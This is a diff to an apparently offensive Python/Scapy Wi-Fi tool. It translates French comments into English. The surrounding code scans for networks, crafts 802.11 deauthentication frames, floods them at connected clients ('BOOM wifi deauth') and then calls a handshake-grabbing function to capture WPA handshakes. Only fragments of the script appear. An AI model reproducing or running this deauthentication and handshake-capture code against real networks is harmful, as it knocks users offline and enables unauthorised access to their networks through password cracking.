@@ -86,7 +86,7 @@ def scan_wifi_networks():
     ssid_list = []
     ssid_set = set()
 
-    # Fonction for recieve packet
+    # Function for recieve packet
     def packet_handler(packet):
         global channel, bssid, ssid
         if packet.haslayer(Dot11Beacon):
@@ -194,7 +194,7 @@ if bssid_list:
             #Client grab
             client_grab(mac_now, channel, ssid)
 
-            #requete de deauth pour le client
+            #DeAuth client request
             packet = RadioTap()/Dot11(addr1=client, addr2=mac, addr3=mac)/Dot11Deauth()
 
             print(BLUE,f"\n[+] DeAuth for : {ssid} with mac : {mac}\n\n",RED)
@@ -203,7 +203,7 @@ if bssid_list:
             sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1),RESET# BOOM wifi deauth
 
 
-            #recup du handshake
+            #Start handshake grabber function
             handshake_grab(mac_now, channel, ssid)
 
            
